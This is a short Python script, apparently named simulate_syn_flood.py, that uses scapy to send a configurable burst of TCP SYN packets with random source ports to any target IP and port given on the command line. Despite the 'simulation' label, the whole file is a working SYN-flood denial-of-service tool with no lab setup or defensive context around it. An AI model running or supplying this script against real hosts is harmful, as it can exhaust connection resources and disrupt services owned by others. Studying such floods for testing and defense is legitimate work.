from scapy.all import IP, TCP, send
import time
import sys
import random

def syn_flood(target_ip, target_port, packet_count=100):
    print(f"Sending {packet_count} SYN packets to {target_ip}:{target_port}")
    for i in range(packet_count):
        sport = random.randint(1024, 65535)
        ip = IP(dst=target_ip)
        tcp = TCP(dport=int(target_port), flags='S', sport=sport)
        packet = ip/tcp
        send(packet, verbose=0)
    print("SYN flood simulation complete.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 simulate_syn_flood.py <target_ip> <target_port> [packet_count]")
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    packet_count = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    syn_flood(target_ip, target_port, packet_count)
